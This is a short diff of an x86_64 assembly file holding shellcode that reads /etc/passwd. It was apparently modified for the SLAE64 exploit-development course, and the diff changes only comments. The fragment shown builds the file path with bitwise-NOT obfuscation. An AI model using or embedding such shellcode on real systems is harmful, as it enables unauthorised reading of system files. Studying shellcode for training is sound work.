@@ -2,7 +2,7 @@ BITS 64
 ;Original Author Mr.Un1k0d3r - RingZer0 Team
 ; Read /etc/passwd Linux x86_64 Shellcode
 ; Shellcode size 82 bytes
-; Modified by Christophe G slae64 - 1337
+; Modified by Christophe G SLAE64 - 1337
 ; New size 75 bytes
 
 
@@ -11,7 +11,7 @@ global _start
 _start:
   xor r9 , r9
   push dword 0x64777373            ; "sswd"
-  mov rdi , 0x9e8fd0d09c8b9ad0     ; "/etc/passwd" , one part is "noted"
+  mov rdi , 0x9e8fd0d09c8b9ad0     ; "/etc/pa" , ("noted" part)
   not rdi
   push rdi
   push rsp
